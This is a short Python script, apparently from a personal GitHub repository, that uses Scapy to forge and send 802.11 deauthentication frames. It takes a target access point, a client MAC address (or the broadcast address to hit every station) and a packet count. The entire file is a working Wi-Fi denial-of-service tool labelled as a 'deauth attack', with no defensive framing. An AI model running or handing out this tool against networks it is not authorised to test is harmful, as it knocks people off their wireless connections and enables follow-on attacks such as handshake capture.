# https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py

import argparse

from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Passing arguments
parser = argparse.ArgumentParser(prog="Scapy deauth attack",
                                 usage="%(prog)s -i mon0 -b 00:11:22:33:44:55 -t 55:44:33:22:11:00 -c 50",
                                 description="Scapy based wifi Deauth by @catalyst256",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")

parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the Wireless Access Point you want to target")

parser.add_argument("-c", "--Client", required=True,
                    help="The MAC address of the Client you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")

parser.add_argument("-n", "--Number", required=True, help="The number of deauth packets you want to send")

args = parser.parse_args()

reason_input = input("Which option do you want ? \n "
"1-Unspecified \n "
"4-Disassoiated due to inactivity \n "
"5-Disassociated because AP is unable to handle all currently associated stations\n "
"8-Deauthenticated because sending STA is leaving BSS\n")

if(int(reason_input) == 5):
    mac_source = args.BSSID
    mac_dest = args.Client
else:
    mac_source = args.Client
    mac_dest = args.BSSID

# Sending deauth

packet = RadioTap() / Dot11(type=0, subtype=12, addr1=mac_dest, addr2=mac_source, addr3=args.BSSID) / Dot11Deauth(
   reason = int(reason_input))

sendp(packet, inter=0.1, count=int(args.Number), iface=args.Interface, verbose=1)